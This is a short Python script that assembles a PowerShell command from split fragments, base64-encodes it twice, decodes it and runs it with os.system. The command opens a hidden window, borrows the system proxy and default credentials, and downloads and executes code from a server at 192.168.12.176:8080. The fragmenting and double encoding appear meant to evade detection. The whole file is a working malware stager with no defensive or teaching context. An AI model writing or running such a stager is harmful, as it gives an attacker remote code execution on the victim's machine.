import os
import base64

payload_1 = "powershell.exe "
payload_2 = "-nop -w hidden -c $T=new-object net.webclient;"
payload_3 = "$T.proxy=[Net.WebRequest]::GetSystemWebProxy();"
payload_4 = "$T.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
payload_5 = "IEX $T.downloa"
payload_6 = "dstring('http://192.168.12.176:8080/');"

whole_payload = ''.join([payload_1,payload_2,payload_3,payload_4,payload_5,payload_6])

encode_payload = base64.b64encode(whole_payload.encode("ascii"))
twice_encode_payload = base64.b64encode(encode_payload)
payload_decode = base64.b64decode(base64.b64decode(twice_encode_payload))
os.system(payload_decode.decode('utf-8'))